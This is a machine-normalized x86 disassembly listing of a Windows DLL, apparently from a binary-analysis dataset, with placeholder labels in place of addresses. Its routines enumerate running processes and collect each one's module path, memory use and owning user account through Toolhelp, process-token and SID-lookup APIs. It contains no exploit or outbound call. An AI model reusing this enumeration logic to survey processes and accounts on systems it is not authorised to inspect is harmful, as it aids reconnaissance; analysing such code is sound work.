push eax
push rw-data
call edi
mov eax edi
mov ecx [ esp + 0x660 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x648 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
mov ebx [ esp + 0x1c ]
mov esi eax
cmp eax ebx
je r-xdata
mov ebx [ rw-data ]
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x60 ] 0xf
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x668 ] 0x1
cmp [ esp + 0x28 ] 0x0
jbe r-xdata
mov ecx 0x14
call sub_100382c0
push eax
push rw-data
call edi
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x20 ] 0x0
mov ecx esi
call sub_100153c0
add esi 0x54
cmp esi ebx
jne r-xdata
push 0x94
call sub_1003cdeb
mov esi eax
add esp 0x4
mov [ esp + 0x14 ] esi
mov [ esp + 0x668 ] 0x8
test esi esi
je r-xdata
mov edi [ esp + 0x18 ]
add edi 0x50
jmp r-xdata
mov eax [ esp + 0x18 ]
xor esi esi
mov eax [ esp + 0x48 ]
mov ecx [ eax - 0x10 ]
add eax 0xfffffff0
mov ecx [ ecx + 0x8 ]
add ecx eax
push ecx
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
call eax
push edx
push eax
mov ecx esi
call sub_10018c90
mov esi eax
jmp r-xdata
push [ edi - 0x50 ]
lea eax [ esp + 0xb0 ]
push [ esp + 0x28 ]
push eax
call sub_100165e0
add esp 0xc
cmp [ esp + 0xac ] 0x0
jne r-xdata
mov [ esp + 0x668 ] 0x1
cmp [ esp + 0x40 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ esp + 0x668 ] 0x1
lea eax [ esp + 0x4c ]
push 0xffffffff
push 0x0
mov [ esp + 0x44 ] 0x0
lea ecx [ esp + 0x34 ]
mov [ esp + 0x48 ] 0x0
push eax
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
call sub_100018b0
mov [ esp + 0x668 ] 0x9
lea ecx [ esi + 0x34 ]
lea eax [ esp + 0x2c ]
cmp ecx eax
je r-xdata
lea ecx [ esp + 0xac ]
lea edx [ ecx + 0x1 ]
nop
xor ecx ecx
jmp r-xdata
mov [ esp + 0x40 ] 0xf
mov [ esp + 0x3c ] 0x0
mov [ esp + 0x2c ] 0x0
test esi esi
jne r-xdata
push [ esp + 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xb0 ]
push eax
lea ecx [ esp + 0x54 ]
call sub_10005470
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edi [ eax + 0x8 ]
add edi esi
xor edi edi
jmp r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov [ esp + 0x60 ] 0xf
mov [ esp + 0x5c ] 0x0
mov [ esp + 0x4c ] 0x0
push [ esp + 0x4c ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x668 ] 0x0
cmp [ esp + 0x60 ] 0x10
jb r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0x54 ]
call sub_10005470
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x2c ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ edi - 0x4c ]
push eax
call sub_10003a20
mov [ esp + 0x680 ] 0x2
mov [ esp + 0x680 ] 0x1
lea ecx [ esp + 0xac ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x668 ] 0x3
lea ecx [ esp + 0x4c ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x668 ] 0x1
cmp [ esp + 0xa8 ] 0x10
jb r-xdata
cmp [ esi ] 0x0
mov [ esp + 0xa8 ] 0xf
mov [ esp + 0xa4 ] 0x0
mov [ esp + 0x94 ] 0x0
jne r-xdata
push [ esp + 0x94 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
lea edx [ ecx + 0x1 ]
mov edi edi
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0x54 ]
call sub_10005470
push [ edi ]
lea eax [ esp + 0xb0 ]
push [ esp + 0x28 ]
push eax
call sub_100165e0
add esp 0xc
cmp [ esp + 0xac ] 0x0
jne r-xdata
lea ecx [ esp + 0xac ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xb0 ]
push eax
lea ecx [ esp + 0x54 ]
call sub_10005470
cmp [ esi ] 0x0
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
jmp r-xdata
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
push ecx
push esi
lea ecx [ esp + 0x54 ]
call sub_10005470
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x2c ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ edi - 0x1c ]
push eax
call sub_10003a20
mov [ esp + 0x680 ] 0x4
mov [ esp + 0x680 ] 0x1
lea ecx [ esp + 0x7c ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x668 ] 0x5
lea ecx [ esp + 0x4c ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x668 ] 0x1
cmp [ esp + 0x78 ] 0x10
jb r-xdata
sub ecx edx
cmp [ esi ] 0x0
mov [ esp + 0x78 ] 0xf
mov [ esp + 0x74 ] 0x0
mov [ esp + 0x64 ] 0x0
jne r-xdata
push [ esp + 0x64 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0x54 ]
call sub_10005470
mov eax [ edi - 0x4 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push [ esp + 0x28 ]
lea eax [ esp + 0xb4 ]
push eax
call sub_100165e0
add esp 0xc
cmp [ esp + 0xac ] 0x0
jne r-xdata
mov ecx esi
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
lea ecx [ esp + 0xac ]
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0x54 ]
call sub_10005470
sub esp 0x18
xor eax eax
mov ecx esp
mov [ esp + 0x2c ] esp
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ edi - 0x34 ]
push eax
call sub_10003a20
mov [ esp + 0x680 ] 0x6
mov [ esp + 0x680 ] 0x1
lea ecx [ esp + 0x94 ]
call sub_1003c1b0
add esp 0x18
mov [ esp + 0x668 ] 0x7
lea ecx [ esp + 0x4c ]
push 0xffffffff
push 0x0
push eax
call sub_100050b0
mov [ esp + 0x668 ] 0x1
cmp [ esp + 0x90 ] 0x10
jb r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
lea eax [ esp + 0xb0 ]
push eax
lea ecx [ esp + 0x54 ]
call sub_10005470
cmp [ esi ] 0x0
mov [ esp + 0x90 ] 0xf
mov [ esp + 0x8c ] 0x0
mov [ esp + 0x7c ] 0x0
jne r-xdata
push [ esp + 0x7c ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
lea edx [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push esi
lea ecx [ esp + 0x54 ]
call sub_10005470
cmp [ ebx ] 0x0
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push ebx
lea ecx [ esp + 0x54 ]
call sub_10005470
add edi 0x54
dec [ esp + 0x28 ]
jne r-xdata
sub_10015b60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004df92
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb70
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edx
mov [ ebp - 0xb74 ] ecx
push 0x0
push 0x2
call [ CreateToolhelp32Snapshot@IAT ]
mov [ ebp - 0xb70 ] eax
cmp eax 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x0
mov esi [ InterlockedExchange@IAT ]
jne r-xdata
call [ GetLastError@IAT ]
mov [ edi ] eax
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] 0x0
mov [ ebp - 0xb6c ] eax
jne r-xdata
mov ecx 0x4c
call sub_100382c0
push eax
push rw-data
call esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp - 0xb6c ]
mov eax [ rw-data ]
push eax
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
push 0x22c
mov [ ebp - 0xb6c ] eax
lea eax [ ebp - 0xb10 ]
push 0x0
push eax
call sub_10045ec0
mov esi [ ebp - 0xb70 ]
lea eax [ ebp - 0xb10 ]
add esp 0xc
mov [ ebp - 0xb10 ] 0x22c
push eax
push esi
call [ Process32FirstW@IAT ]
test eax eax
jne r-xdata
mov ecx 0xe
call sub_100383b0
push eax
push rw-data
call esi
mov edi [ ebp - 0xb70 ]
call [ GetLastError@IAT ]
push esi
mov [ edi ] eax
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
lea eax [ ebp - 0xaec ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
xor eax eax
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0xaec ]
push eax
lea ecx [ ebp - 0xb64 ]
call sub_10009730
cmp [ ebp - 0xb6c ] 0x0
push [ ebp - 0xb68 ]
push 0x0
je r-xdata
push 0x410
call esi
mov esi eax
test esi esi
je r-xdata
push 0x400
call esi
mov esi eax
test esi esi
je r-xdata
mov esi [ CloseHandle@IAT ]
push 0x412
lea eax [ ebp - 0x860 ]
push 0x0
push eax
call sub_10045ec0
add esp 0xc
lea eax [ ebp - 0x860 ]
push 0x209
push eax
push 0x0
push esi
call [ GetModuleFileNameExW@IAT ]
test eax eax
je r-xdata
push 0x434
lea eax [ ebp - 0x448 ]
push 0x0
push eax
call sub_10045ec0
add esp 0xc
mov [ ebp - 0xb78 ] 0x21a
lea eax [ ebp - 0xb78 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
push 0x0
push esi
call [ ebp - 0xb6c ]
test eax eax
je r-xdata
mov esi [ OpenProcess@IAT ]
xor eax eax
mov [ ebp - 0xb54 ] 0x0
mov [ ebp - 0xb50 ] 0x0
mov [ ebp - 0xb50 ] 0x7
mov [ ebp - 0xb54 ] 0x0
mov [ ebp - 0xb64 ] ax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xb3c ] eax
mov [ ebp - 0xb38 ] eax
mov [ ebp - 0xb38 ] 0x7
mov [ ebp - 0xb3c ] eax
mov [ ebp - 0xb4c ] ax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0xb24 ] eax
mov [ ebp - 0xb20 ] eax
mov [ ebp - 0xb20 ] 0x7
mov [ ebp - 0xb24 ] eax
mov [ ebp - 0xb34 ] ax
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0xaec ] 0x0
mov eax [ ebp - 0xb08 ]
mov [ ebp - 0xb68 ] eax
mov eax [ ebp - 0xb0c ]
mov [ ebp - 0xb1c ] eax
mov eax [ ebp - 0xafc ]
mov [ ebp - 0xb18 ] eax
jne r-xdata
push edi
call esi
mov eax 0x1
push 0x28
xorps xmm0 xmm0
lea eax [ ebp - 0x8b8 ]
push eax
movdqu [ ebp - 0x8b8 ] xmm0
push esi
movdqu [ ebp - 0x8a8 ] xmm0
mov [ ebp - 0x8b8 ] 0x28
movq [ ebp - 0x898 ] xmm0
call [ GetProcessMemoryInfo@IAT ]
neg eax
lea ecx [ ebp - 0x878 ]
mov edx esi
sbb eax eax
and eax [ ebp - 0x8ac ]
mov [ ebp - 0xb1c ] eax
call sub_100160e0
mov edi eax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp - 0xb34 ]
cmp eax edi
je r-xdata
cmp [ ebp - 0x860 ] 0x0
jne r-xdata
push 0x28
xorps xmm0 xmm0
lea eax [ ebp - 0x8e0 ]
push eax
movdqu [ ebp - 0x8e0 ] xmm0
push esi
movdqu [ ebp - 0x8d0 ] xmm0
mov [ ebp - 0x8e0 ] 0x28
movq [ ebp - 0x8c0 ] xmm0
call [ GetProcessMemoryInfo@IAT ]
neg eax
lea ecx [ ebp - 0x890 ]
mov edx esi
sbb eax eax
and eax [ ebp - 0x8d4 ]
mov [ ebp - 0xb1c ] eax
call sub_100160e0
mov edi eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0xb34 ]
cmp eax edi
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x864 ] 0x8
jb r-xdata
cmp [ ebp - 0xb20 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x860 ]
lea edx [ ecx + 0x2 ]
xor ecx ecx
jmp r-xdata
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x87c ] 0x8
jb r-xdata
cmp [ ebp - 0xb20 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x448 ]
lea edx [ ecx + 0x2 ]
lea ebx [ ebx ]
xor ecx ecx
jmp r-xdata
xor eax eax
mov [ ebp - 0x864 ] 0x7
push esi
mov esi [ CloseHandle@IAT ]
mov [ ebp - 0x868 ] 0x0
mov [ ebp - 0x878 ] ax
call esi
mov edi [ ebp - 0xb70 ]
jmp r-xdata
push [ ebp - 0x878 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0xb20 ] 0x7
push edi
lea ecx [ ebp - 0xb34 ]
mov [ ebp - 0xb24 ] 0x0
mov [ ebp - 0xb34 ] ax
call sub_10003980
push [ ebp - 0xb34 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x860 ]
push eax
lea ecx [ ebp - 0xb4c ]
call sub_10009730
xor eax eax
mov [ ebp - 0x87c ] 0x7
push esi
mov esi [ CloseHandle@IAT ]
mov [ ebp - 0x880 ] 0x0
mov [ ebp - 0x890 ] ax
call esi
mov edi [ ebp - 0xb70 ]
jmp r-xdata
push [ ebp - 0x890 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp - 0xb20 ] 0x7
push edi
lea ecx [ ebp - 0xb34 ]
mov [ ebp - 0xb24 ] 0x0
mov [ ebp - 0xb34 ] ax
call sub_10003980
push [ ebp - 0xb34 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
push ecx
lea eax [ ebp - 0x448 ]
push eax
lea ecx [ ebp - 0xb4c ]
call sub_10009730
mov ecx [ ebp - 0xb74 ]
lea eax [ ebp - 0xb68 ]
push eax
call sub_10016380
push 0x22c
lea eax [ ebp - 0xb10 ]
push 0x0
push eax
call sub_10045ec0
add esp 0xc
mov [ ebp - 0xb10 ] 0x22c
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xb68 ]
call sub_100153c0
lea eax [ ebp - 0xb10 ]
push eax
push edi
call [ Process32NextW@IAT ]
test eax eax
jne r-xdata
sub_100160e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004dfed
mov eax [ fs : 0x0 ]
push eax
sub esp 0xe48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0xe38 ] 0x0
xor eax eax
mov [ ebp - 0xe20 ] 0x0
mov [ ebp - 0xe1c ] 0x0
mov [ ebp - 0xe48 ] edi
mov [ ebp - 0xe1c ] 0x7
mov [ ebp - 0xe20 ] 0x0
mov [ ebp - 0xe30 ] ax
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0xe34 ]
push eax
push 0x8
push edx
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xe44 ]
mov [ ebp - 0xe44 ] 0x5bc
push eax
push 0x5bc
lea eax [ ebp - 0xe18 ]
push eax
push 0x1
push [ ebp - 0xe34 ]
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x10 ] eax
mov ecx edi
mov [ edi + 0x14 ] 0x7
mov [ edi ] ax
lea eax [ ebp - 0xe30 ]
push eax
call sub_10003980
jmp r-xdata
call [ GetLastError@IAT ]
push 0x41a
lea eax [ ebp - 0x430 ]
mov [ ebp - 0xe3c ] 0x20c
push 0x0
push eax
mov [ ebp - 0xe40 ] 0x213
call sub_10045ec0
push 0x428
lea eax [ ebp - 0x858 ]
push 0x0
push eax
call sub_10045ec0
add esp 0x18
lea eax [ ebp - 0xe4c ]
push eax
lea eax [ ebp - 0xe40 ]
push eax
lea eax [ ebp - 0x858 ]
push eax
lea eax [ ebp - 0xe3c ]
push eax
lea eax [ ebp - 0x430 ]
push eax
push [ ebp - 0xe18 ]
push 0x0
call [ LookupAccountSidW@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0xe38 ] 0x1
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xe1c ] 0x8
jb r-xdata
xor eax eax
mov [ ebp - 0xe1c ] 0x7
mov [ ebp - 0xe20 ] eax
mov [ ebp - 0xe30 ] ax
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp - 0xe30 ]
call j_sub_1003f3e3#2
add esp 0x4
push [ ebp - 0xe34 ]
call [ CloseHandle@IAT ]
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov ecx edi
mov [ edi ] ax
lea eax [ ebp - 0xe30 ]
push eax
call sub_10003980
lea ecx [ ebp - 0x858 ]
lea edx [ ecx + 0x2 ]
lea ecx [ ecx ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
sar ecx 0x1
je r-xdata
cmp [ ebp - 0x430 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
lea ecx [ ebp - 0x430 ]
lea edx [ ecx + 0x2 ]
mov edi edi
xor ecx ecx
lea eax [ ebp - 0x430 ]
push ecx
push eax
lea ecx [ ebp - 0xe30 ]
call sub_10005dc0
jmp r-xdata
mov esi [ rw-data ]
lea eax [ ebp - 0x858 ]
push eax
lea ecx [ ebp - 0xe30 ]
call sub_10005ca0
push esi
lea ecx [ ebp - 0xe30 ]
call sub_10005ca0
mov ecx 0xd
call sub_100383b0
push eax
push rw-data
call [ InterlockedExchange@IAT ]
mov ax [ ecx ]
add ecx 0x2
test ax ax
jne r-xdata
sub ecx edx
lea eax [ ebp - 0x430 ]
sar ecx 0x1
push ecx
push eax
lea ecx [ ebp - 0xe30 ]
call sub_10005dc0
jmp r-xdata
sub_10016380
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e042
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi + 0x4 ]
mov edi [ ebp + 0x8 ]
cmp edi ecx
jae r-xdata
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov eax [ esi ]
cmp eax edi
ja r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_10016440
sub edi eax
mov eax 0x30c30c31
imul edi
sar edx 0x4
mov edi edx
shr edi 0x1f
add edi edx
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
add [ esi + 0x4 ] 0x54
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push edi
mov ecx [ esi + 0x4 ]
imul eax edi 0x54
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x10 ] ecx
add eax [ esi ]
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
push ecx
mov ecx esi
call sub_10016440
push eax
jmp r-xdata
call sub_10016740
sub_10016440
push esi
mov esi [ ecx + 0x4 ]
mov eax 0x30c30c31
push edi
mov edi [ ecx + 0x8 ]
mov edx edi
sub edx esi
imul edx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jae r-xdata
pop edi
pop esi
retn 0x4
sub esi [ ecx ]
mov eax 0x30c30c31
imul esi
push ebx
sar edx 0x4
mov ebx 0x30c30c3
mov esi edx
mov eax ebx
shr esi 0x1f
add esi edx
sub eax esi
cmp eax 0x1
jb r-xdata
push r--data
call sub_1003c5be
sub edi [ ecx ]
mov eax 0x30c30c31
imul edi
inc esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov edx eax
shr edx 0x1
sub ebx edx
cmp ebx eax
pop ebx
jae r-xdata
add eax edx
cmp eax esi
cmovb eax esi
push eax
call sub_100164e0
xor eax eax
cmp eax esi
cmovb eax esi
push eax
call sub_100164e0
pop edi
pop esi
retn 0x4
sub_100164e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e060
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
sub esp 0x8
push edi
mov edx [ ebx + 0x4 ]
mov ecx [ ebx ]
call sub_10017090
add esp 0x10
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x14 ] eax
mov esi [ ebx ]
mov ecx eax
sub ecx esi
mov eax 0x30c30c31
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
cmp eax 0x30c30c3
ja r-xdata
imul eax [ ebp + 0x8 ] 0x54
add eax edi
mov [ ebx + 0x8 ] eax
imul eax [ ebp - 0x18 ] 0x54
add eax edi
mov [ ebx + 0x4 ] eax
mov [ ebx ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ ebp - 0x14 ]
je r-xdata
call sub_1003c58d
imul eax eax 0x54
push eax
call sub_1003cdeb
add esp 0x4
mov edi eax
mov [ ebp - 0x14 ] edi
test edi edi
jne r-xdata
push [ ebx ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
call sub_100153c0
add esi 0x54
cmp esi [ ebp - 0x14 ]
jne r-xdata
sub_10016600
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx edx
push edi
mov edi ecx
mov [ ebp - 0x4 ] esi
mov ecx ebx
mov eax 0x30c30c31
sub ecx edi
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x20
jle r-xdata
cmp eax 0x1
jle r-xdata
mov esi [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp edi ebx
je r-xdata
cmp eax 0x20
jle r-xdata
push [ ebp - 0x4 ]
mov edx edi
lea ecx [ ebp - 0xc ]
push ebx
call sub_10016810
mov eax esi
add esp 0x8
cdq
sub eax edx
mov ecx eax
sar ecx 0x1
mov eax ecx
cdq
sub eax edx
sar eax 0x1
add ecx eax
mov eax 0x30c30c31
mov [ ebp + 0x8 ] ecx
mov ecx ebx
sub ecx [ ebp - 0x8 ]
imul ecx
mov ecx [ ebp - 0xc ]
mov eax 0x30c30c31
push [ ebp - 0x4 ]
sar edx 0x4
sub ecx edi
mov esi edx
shr esi 0x1f
add esi edx
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax esi
mov esi [ ebp + 0x8 ]
push esi
jge r-xdata
push esi
mov edx ebx
mov ecx edi
call sub_10016e30
add esp 0x4
mov esi [ ebp - 0x4 ]
mov ecx ebx
mov eax 0x30c30c31
sub ecx edi
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
jle r-xdata
mov ecx [ ebp - 0x8 ]
mov edx ebx
call sub_10016600
mov ebx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
mov ecx edi
call sub_10016600
mov edi [ ebp - 0x8 ]
jmp r-xdata
push [ ebp - 0x4 ]
mov edx ebx
mov ecx edi
call sub_10016ce0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub esp 0x8
mov edx ebx
mov ecx edi
push [ ebp - 0x4 ]
call sub_10016bb0
add esp 0xc
test esi esi
jle r-xdata
mov ecx ebx
mov eax 0x30c30c31
sub ecx edi
add esp 0x8
imul ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x20
jg r-xdata
sub_10016740
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e0a1
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
lea ecx [ edi + 0x4 ]
push 0xffffffff
mov eax [ esi ]
mov [ edi ] eax
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esi + 0x4 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x0
lea ecx [ edi + 0x1c ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
push 0xffffffff
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esi + 0x1c ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
lea ecx [ edi + 0x34 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
push 0xffffffff
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esi + 0x34 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ esi + 0x50 ]
mov [ edi + 0x50 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10016810
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx edx
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x8 ]
mov eax 0x30c30c31
push esi
mov esi ecx
mov [ ebp - 0xc ] ebx
sub esi ebx
imul esi
push edi
mov edi [ ebp + 0xc ]
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cdq
sub eax edx
sar eax 0x1
imul esi eax 0x54
lea eax [ ecx - 0x54 ]
push edi
push eax
mov ecx ebx
add esi ebx
mov edx esi
call sub_10016a00
add esp 0x8
lea ebx [ esi + 0x54 ]
mov [ ebp - 0x8 ] ebx
cmp [ ebp - 0xc ] esi
jae r-xdata
mov ecx [ ebp + 0x8 ]
cmp ebx ecx
jae r-xdata
mov ebx [ ebp - 0xc ]
mov eax esi
mov edi ebx
mov [ ebp - 0x4 ] eax
push esi
push ebx
call edi
add esp 0x8
test al al
jne r-xdata
mov ebx [ ebp - 0x8 ]
push [ ebp - 0x10 ]
push esi
call edi
add esp 0x8
test al al
jne r-xdata
mov ecx [ ebp - 0xc ]
cmp eax ecx
jbe r-xdata
lea ebx [ ebx ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
call edi
